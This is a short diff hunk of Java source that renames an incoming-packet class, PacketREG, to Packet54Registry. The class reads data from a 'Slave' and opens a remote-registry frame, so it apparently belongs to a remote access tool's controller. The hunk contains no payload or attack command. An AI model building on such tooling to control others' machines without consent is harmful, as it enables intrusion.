@@ -8,7 +8,7 @@ import com.redpois0n.Slave;
 import com.redpois0n.ui.frames.FrameRemoteRegistry;
 
 
-public class PacketREG extends AbstractIncomingPacket {
+public class Packet54Registry extends AbstractIncomingPacket {
 
 	@Override
 	public void read(Slave slave, DataInputStream dis) throws Exception {
